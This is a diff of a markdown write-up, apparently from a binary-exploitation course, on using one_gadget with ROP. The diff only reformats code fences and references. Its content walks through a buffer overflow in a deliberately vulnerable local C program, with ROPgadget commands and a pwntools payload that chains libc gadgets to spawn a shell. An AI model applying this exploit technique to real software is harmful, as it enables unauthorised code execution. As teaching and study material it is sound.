@@ -15,7 +15,7 @@ date: 2023-01-16
 > 原理是在 `glibc` 裡面有很多會透過 `execve` 執行 `/bin/sh`、再調用外部系統指令的 assembly，當 explolit 已經得知 `libc` 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數
 
 ## Original Code
-```cpp!=
+```cpp
 #include <stdio.h>
 #include <unistd.h>
 
@@ -34,7 +34,7 @@ int main()
 ```
 * The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use `ROP` to get shell.
 * Note that, it must be a dynamic library, so DO NOT use `-static` to compile it.
-    ```bash!
+    ```bash
     gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack
     ```
 
@@ -52,14 +52,14 @@ int main()
         [rdx] == NULL || rdx == NULL
         ```
 * Then, we use `one_gadget` command to get `ROP` chain
-    ```bash!
+    ```bash
     ROPgadget --binary one_gadget_with_rop --only "pop|ret" > one_gadget
     vim one_gadget
     ```
     You can see that because we didn't compile with library, the gadget that we may can use is very few.
     ![](https://imgur.com/DuGINHL.png)
     The solution is using the gadget that `libc` have:
-    ```bash!
+    ```bash
     $ ROPgadget --binary  /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" > one_gadget
     $ vim one_gadget
     ```
@@ -72,7 +72,7 @@ int main()
     ![](https://imgur.com/Et3r2hI.png)
     Then we can know the offset and construct apart of payload as below 
     $$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$
-    ```python!=
+    ```python
     from pwn import *
     import sys
 
@@ -85,12 +85,12 @@ int main()
     info(f"libc: {hex(libc)}")
     ```
 * And prepare our gadget:
-    ```python!=11
+    ```python
     pop_rdx_rbx_ret = libc + 0x90529
     pop_rsi_ret = libc + 0x2be51
     ```
 * Construct whole payload with considering the constraint:
-    ```python!=13
+    ```python
     r.send(b'a'*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
     r.interactivae()
     ```
@@ -101,7 +101,6 @@ int main()
 * Finally, we got shell!!!
     ![](https://imgur.com/iIETaBy.png)
 
-
 ## Reference
-[Linux ldd 查看執行檔執行時需要哪些 library](https://shengyu7697.github.io/linux-ldd/)
-[Pwn week1](https://youtu.be/ktoVQB99Gj4)
+* [Linux ldd 查看執行檔執行時需要哪些 library](https://shengyu7697.github.io/linux-ldd/)
+* [Pwn week1](https://youtu.be/ktoVQB99Gj4)
